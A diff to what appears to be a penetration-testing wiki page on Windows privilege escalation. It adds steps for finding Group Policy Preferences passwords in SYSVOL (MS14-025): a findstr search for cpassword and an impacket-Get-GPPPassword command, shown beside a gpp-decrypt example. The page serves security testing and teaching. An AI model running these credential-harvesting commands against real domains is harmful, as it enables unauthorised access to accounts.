@@ -532,11 +532,23 @@ Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents 
 * Printers.xml
 * Drives.xml
 
+Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.
+
+```
+findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
+```
+
 **To decrypt the cPassword:**
 
 ```bash
 #To decrypt these passwords you can decrypt it using
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
+```
+
+#### Using impacket to retrieve the decrypted password
+
+```
+impacket-Get-GPPPassword -no-pass '10.10.10.100' -share Replication
 ```
 
 Using crackmapexec to get the passwords:
